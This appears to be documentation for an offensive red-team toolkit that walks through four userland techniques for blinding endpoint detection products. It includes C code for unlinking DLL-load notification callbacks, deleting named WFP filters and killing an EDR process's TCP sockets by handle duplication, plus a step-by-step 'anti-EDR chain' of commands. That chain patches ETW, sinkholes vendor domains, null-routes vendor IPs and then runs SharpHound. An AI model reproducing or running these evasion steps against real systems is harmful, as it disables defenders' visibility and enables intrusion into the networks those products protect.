# Novel Userland EDR Evasion Techniques — Beyond the Obvious

This document covers four techniques that are rarely discussed and that most
practitioners believe require kernel access or are simply not attempted. All are
100% userland, 100% confirmed feasible.

---

## Technique 1: LDR Notify Purge — Remove EDR DLL Load Notifications

**File:** `ldr_notify_purge.bof.c`

### The Mechanism

When an EDR DLL loads into a process, it calls `LdrRegisterDllNotification` to
register a callback that fires whenever ANY subsequent DLL loads. The EDR uses
this to immediately hook the new DLL's exports.

```
LoadLibrary("Rubeus.dll")
  → ntdll!LdrLoadDll
  → ntdll!LdrpCallDllNotifications
  → [EDR callback fires]
  → EDR installs hooks on Rubeus.dll exports
  → EDR sends telemetry: "DLL loaded"
  → Rubeus.dll entry point runs (now with EDR hooks)
```

`LdrRegisterDllNotification` stores callbacks in `LdrpDllNotificationList`,
a circular doubly-linked list in ntdll's writable data section.

Structure at each list node:
```
+0x00  LIST_ENTRY Links    → Flink / Blink
+0x10  PVOID      Callback → EDR's hook installer function
+0x18  PVOID      Context  → EDR DLL private data
```

The "cookie" returned by `LdrRegisterDllNotification` IS a direct pointer to
this structure. `LdrUnregisterDllNotification` simply unlinks the node.

### Why This Is Novel

Standard "unhooking" removes hooks from **already-loaded** DLLs. This technique
prevents hooks from being installed on **any DLL loaded after the operation**.
No existing red team toolkit does this explicitly.

### Implementation (BOF)

```c
// 1. Register our own dummy callback to get a list entry pointer
PVOID myCookie;
LdrRegisterDllNotification(0, NopCallback, NULL, &myCookie);

// 2. Walk the circular list from our entry
LIST_ENTRY* cur = ((LDR_DLL_NOTIFICATION_ENTRY*)myCookie)->Links.Flink;
while (cur != &myEntry->Links) {
    LDR_DLL_NOTIFICATION_ENTRY* entry = (LDR_DLL_NOTIFICATION_ENTRY*)cur;
    LIST_ENTRY* next = cur->Flink;  // save before unlink

    // 3. Identify owner DLL via VirtualQuery + GetModuleFileNameW
    // 4. Unlink non-system entries
    if (!IsSystemDll(entry->Callback)) {
        entry->Links.Blink->Flink = entry->Links.Flink;
        entry->Links.Flink->Blink = entry->Links.Blink;
        // Make self-referential → EDR's LdrUnregisterDllNotification is a no-op
        entry->Links.Flink = &entry->Links;
        entry->Links.Blink = &entry->Links;
    }
    cur = next;
}

// 5. Unregister our dummy
LdrUnregisterDllNotification(myCookie);
```

### Why It Is 100% Confirmed

- `LdrRegisterDllNotification` exported from ntdll since Vista — stable
- Structure offsets (`Links@0`, `Callback@0x10`, `Context@0x18`) confirmed stable
  across Vista/7/8/10/11 via WDK headers and public reversals
- `LdrpDllNotificationList` (ntdll `.data`) is PAGE_READWRITE — no VirtualProtect needed
- Self-referential poisoning ensures EDR's `LdrUnregisterDllNotification(oldCookie)`
  becomes an idempotent no-op rather than a crash

### Operational Use

```
# Step 1: Verify what EDR callbacks exist
ldr_notify_purge list

# Step 2: Purge all non-system callbacks
ldr_notify_purge purge

# Step 3: Load your .NET assembly, reflective DLL, etc. — EDR never sees it
execute-assembly /path/to/SharpHound.exe --CollectionMethod All
```

After purge, any `LoadLibrary`/`LdrLoadDll` call loads the DLL with zero EDR
notification. No hooks installed. No telemetry event for the load.

---

## Technique 2: WFP Filter Purge — Delete EDR Network Inspection via User-Mode API

**File:** `wfp_filter_purge.bof.c`

### The Misconception

Most practitioners (including many EDR engineers) think:
> "Manipulating WFP requires a kernel driver."

This is wrong. WFP has two distinct layers:

```
┌───────────────────────────────────────────────────────────────────┐
│ KERNEL LAYER  fwpkclnt.sys                                        │
│   FwpsCalloutRegister  — registers actual DPI function (KERNEL)   │
│   FwpsFlowAssociateContext                                        │
│   Requires: signed kernel driver                                  │
├───────────────────────────────────────────────────────────────────┤
│ MANAGEMENT LAYER  fwpuclnt.dll  (USERLAND)                        │
│   FwpmEngineOpen0        — connect to BFE service                 │
│   FwpmFilterAdd0/Delete  — add/remove filter RULES               │
│   FwpmCalloutAdd0/Delete — register/remove callout entries        │
│   Requires: local Admin only. No driver. No exploit.              │
│   Same API used by: netsh, Windows Firewall MMC, PowerShell       │
└───────────────────────────────────────────────────────────────────┘
```

The management layer communicates with the Base Filtering Engine (BFE) service
via documented local RPC. BFE then applies changes to the kernel.

### How EDR Uses WFP

```
EDR kernel driver:
  1. FwpsCalloutRegister(...)     → kernel DPI function registered
  2. FwpmCalloutAdd0(...)         → management entry created (has name like "Sense DPI")
  3. FwpmFilterAdd0(...)          → rule: "for TCP connects, invoke callout above"
                                    filter displayData.name = "Sense Network Inspection"
```

**The filter is the rule that triggers the callout.** Without the filter, the
callout function is never invoked regardless of kernel state. The kernel memory
for the FWPS callout still exists — it just receives no traffic.

### Attack

```c
FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);

// Enumerate all filters
FwpmFilterCreateEnumHandle0(hEngine, NULL, &hEnum);
FwpmFilterEnum0(hEngine, hEnum, 512, &entries, &count);

// For each: check name for "sense" / "crowdstrike" / "defender"
// Delete matching:
FwpmFilterDeleteById0(hEngine, entries[i]->filterId);
FwpmCalloutDeleteByKey0(hEngine, &entries[i]->calloutKey);

FwpmEngineClose0(hEngine);
```

### After Deletion

- EDR callout function is never called for new TCP connections
- No connection metadata logged (source IP, destination IP, port)
- No TLS SNI inspection (EDR can't see what domains you're connecting to)
- No process-to-connection correlation
- Windows Firewall user-space rules are unaffected (different provider namespace)

### Detection Profile

`FwpmFilterDeleteById0` is identical to running:
```powershell
Remove-NetFirewallRule -DisplayName "Sense Network Inspection"
```
Standard network administration activity. BFE audit log records deletions,
but few EDR products monitor BFE's own audit trail in real deployments.

### Operational Use

```
# Audit first
wfp_filter_purge list

# Target by keyword
wfp_filter_purge purge sense         # MDE
wfp_filter_purge purge defender      # Windows Defender / MDE
wfp_filter_purge purge crowdstrike   # CrowdStrike
wfp_filter_purge purge carbon        # Carbon Black
wfp_filter_purge purge sentinel      # SentinelOne
```

---

## Technique 3: CLR Profiler Strip — Prevent EDR .NET Code Monitoring

**File:** `clr_profiler_strip.bof.c`

### How EDR Monitors .NET Code

The .NET CLR (and .NET Core) profiling API allows any DLL to attach as a
"profiler" that receives callbacks for every managed method call. EDR products
set environment variables that the CLR reads at startup:

```
COR_ENABLE_PROFILING=1
COR_PROFILER={3C8C2C26-B41F-4F05-A9F1-2C7B00000000}
COR_PROFILER_PATH=C:\Program Files\CrowdStrike\CSFA\csProfiler.dll
```

When you run `execute-assembly`, the CLR starts in the beacon process. If these
vars are set, the EDR profiler DLL loads and hooks every managed method.

This is how EDRs detect and log:
- SharpHound LDAP queries
- Rubeus Kerberos ticket operations
- Seatbelt information gathering
- Any suspicious .NET method call patterns

### The Fix

`SetEnvironmentVariableW(name, NULL)` removes the variable from the current
process environment block. Since the CLR reads these at startup, running this
BOF **before** any `execute-assembly` prevents profiler attachment.

Variables cleared: `COR_ENABLE_PROFILING`, `COR_PROFILER`, `COR_PROFILER_PATH`,
`CORECLR_*` variants, `DOTNET_STARTUP_HOOKS`, `DOTNET_ADDITIONAL_DEPS`, and
EDR-specific prefixed variants (`_COR_PROFILER`).

### Timing Requirement

```
CORRECT:
  clr_profiler_strip strip   ← clear vars
  execute-assembly SharpHound.exe  ← CLR starts, no profiler loaded

WRONG (too late):
  execute-assembly SharpHound.exe  ← CLR starts, EDR profiler loads
  clr_profiler_strip strip   ← CLR already running, vars irrelevant
```

### Why Nobody Does This Explicitly

Most red teamers know execute-assembly can be monitored, but they address it at
the hook/ETW layer. The CLR profiling API is a separate monitoring path that
survives standard API unhooking and ETW session stops. It's a purely user-mode
mechanism that requires a purely user-mode counter: clearing env vars.

---

---

## Technique 4: sock_kill — Terminate Active EDR TCP Connections via AFD Handle Close

**File:** `sock_kill.bof.c`

### The Gap This Fills

NRPT sinkhole and null routing prevent EDR from **establishing new connections**.
They do not terminate connections that are **already open**.

```
Without sock_kill:
  T=0  EDR has live HTTPS session to cloud backend
  T=1  Install nrpt_sinkhole + null_route → new connections blocked
  T=?  Existing connection flows for minutes or hours
  GAP: telemetry keeps flowing during T=1 to T=?

With sock_kill:
  T=1  Install nrpt_sinkhole + null_route
  T=2  sock_kill kill <edr.exe> → TCP RST sent by OS immediately
  T=2  EDR: WSAECONNRESET — cannot reconnect (NRPT + null_route block it)
  RESULT: network-blind from T=2, zero latency gap
```

### The Mechanism

Windows TCP sockets are **NT file objects** managed by `afd.sys` (Ancillary
Function Driver). Every `socket()` call results in a Windows HANDLE pointing to
a kernel FILE_OBJECT at the NT path `\Device\Afd`.

```
NtQueryObject(socketHandle, ObjectNameInformation)
  → "\Device\Afd\Endpoint"   ← this is how we identify sockets
```

`NtDuplicateObject` has a flag `DUPLICATE_CLOSE_SOURCE` (0x1). When set, it
closes the **source handle in the source process** as part of the duplication:

```c
HANDLE hKill;
NtDuplicateObject(
    hEdrProcess,              // source: the EDR process
    (HANDLE)socketHandleValue,// which handle to close
    GetCurrentProcess(),      // target: us (we get a copy)
    &hKill,
    0, 0,
    DUPLICATE_CLOSE_SOURCE    // close EDR's handle
);
NtClose(hKill);  // close our copy → refcount = 0 → afd.sys sends RST
```

When the last handle to an AFD socket is closed:
1. `afd.sys` sends a TCP RST segment to the remote host
2. EDR's pending `send()`/`recv()` returns `WSAECONNRESET`
3. Connection is destroyed — no graceful FIN, just RST
4. Telemetry stops mid-stream

### Why Not Winsock?

Standard `shutdown()` or `closesocket()` require the socket to be in the
**same process's winsock table**. Cross-process socket closure via winsock
would require reading the target's memory (`PROCESS_VM_READ`).

`NtDuplicateObject` only requires `PROCESS_DUP_HANDLE` — significantly weaker.
We identify sockets via the kernel object name (stored in the kernel object
header, not in any user-mode structure), so no memory read in the target process
is needed.

### System Handle Enumeration

`NtQuerySystemInformation(SystemExtendedHandleInformation = 64)` returns all
handles across all processes in a flat array with PID and handle value. We:

1. Call it with a growing buffer (start 1 MB, retry on `STATUS_INFO_LENGTH_MISMATCH`)
2. Filter entries by `entry.UniqueProcessId == targetPid`
3. For each candidate: duplicate, query NT name, check `\Device\Afd` prefix
4. On match: `DUPLICATE_CLOSE_SOURCE` + close local copy

### PPL Compatibility

`PROCESS_DUP_HANDLE` is blocked on PPL processes:

| EDR | Process | PPL | sock_kill |
|-----|---------|-----|-----------|
| Microsoft Defender for Endpoint | MsSense.exe | Yes (Antimalware) | **No** |
| CrowdStrike Falcon | csagent.exe | Yes (Antimalware) | **No** |
| SentinelOne | SentinelAgent.exe | No | **Yes** |
| Elastic EDR | elastic-endpoint.exe | No | **Yes** |
| Carbon Black | cb.exe | No | **Yes** |
| Sophos EDR | SophosEDR.exe | No | **Yes** |

For PPL EDRs: use `nrpt_sinkhole` + `null_route`. The existing connection will
eventually drop naturally, and reconnect attempts fail permanently. No gap in
blocking effectiveness — just a delay in killing the existing session.

### Why This Is Novel

Standard red team network blocking uses:
- WFP filters (leave BFE audit log entries, visible via filter enumeration)
- Routing table entries (visible via `route print`)
- DNS/NRPT (visible in registry)
- Firewall rules (visible in registry, audit log)

`sock_kill` leaves **no persistent artifact**. The only evidence is:
- A TCP RST packet (looks like a normal network hiccup)
- `WSAECONNRESET` error in the EDR process log (internal, not externally
  visible unless EDR is already able to send telemetry)

No public red team toolkit applies `NtDuplicateObject(DUPLICATE_CLOSE_SOURCE)`
specifically to AFD socket handles as a network-blocking primitive. The
primitive itself is well-known (handle theft for credential theft, token theft)
but the application to socket termination is not documented in offensive tooling.

### Operational Use

```
# Step 1: Enumerate to see what sockets the EDR has
sock_kill list SentinelAgent.exe

# Step 2: Install persistent blocks
nrpt_sinkhole *.sentinelone.net;*.pax.sentinelone.net
null_route 54.80.0.1;3.213.0.1

# Step 3: Kill existing connections NOW
sock_kill kill SentinelAgent.exe

# Multiple EDRs at once
sock_kill kill SentinelAgent.exe;elastic-endpoint.exe;cb.exe
```

See `docs/sock-kill-network-technique.md` for the full technical deep-dive.

---

## Complete Anti-EDR Chain (All Layers)

```
# ─── PRE-OPERATION SEQUENCE ────────────────────────────────────────────────

# Layer 0: .NET profiler (do FIRST — CLR must not be started yet)
clr_profiler_strip strip

# Layer 1: ETW behavioral blindness
etwpatch patch <edr_process.exe>           # per-process ETW null (non-PPL)
etw_tamper starve mde                      # session buffer starvation (PPL-safe)
etw_tamper starve crowdstrike

# Layer 2: DLL load monitoring blindness (in-process)
ldr_notify_purge purge                     # unlink EDR DLL notification callbacks

# Layer 3: WFP network inspection blindness
wfp_filter_purge purge sense               # MDE WFP filters
wfp_filter_purge purge crowdstrike         # CrowdStrike WFP filters

# Layer 4: Network connectivity blockade (persistent)
nrpt_sinkhole *.sentinelone.net;*.pax.sentinelone.net   # DNS sinkhole
null_route 54.80.0.1;3.213.0.1                          # IP blackhole

# Layer 5: Kill EXISTING connections immediately (one-shot)
sock_kill kill SentinelAgent.exe           # RST all open TCP sessions now
# For PPL EDRs: skip sock_kill, existing session will drop on its own;
#               reconnect attempts are permanently blocked by Layer 4.

# ─── NOW EXECUTE SENSITIVE OPERATIONS ──────────────────────────────────────
execute-assembly SharpHound.exe ...
```

## Detection Comparison

| Technique | What EDR sees | Persistent artifact | Detectable by |
|---|---|---|---|
| `etw_tamper stop` | Session **Stopped** | No (session gone) | Service state check |
| `etw_tamper starve` | Session Running | No (config value) | Buffer size check |
| `etwpatch` | STATUS_SUCCESS from EtwEventWrite | No (CoW page) | In-memory scan |
| `ldr_notify_purge` | DLL loads, no callback | No (memory state) | Self-integrity check |
| `wfp_filter_purge` | Filter deleted | **Yes** (BFE audit log) | BFE log monitor |
| `clr_profiler_strip` | CLR profiler absent | No | Profiler presence check |
| `sock_kill` | WSAECONNRESET | **No** (TCP RST only) | Handle event correlation |
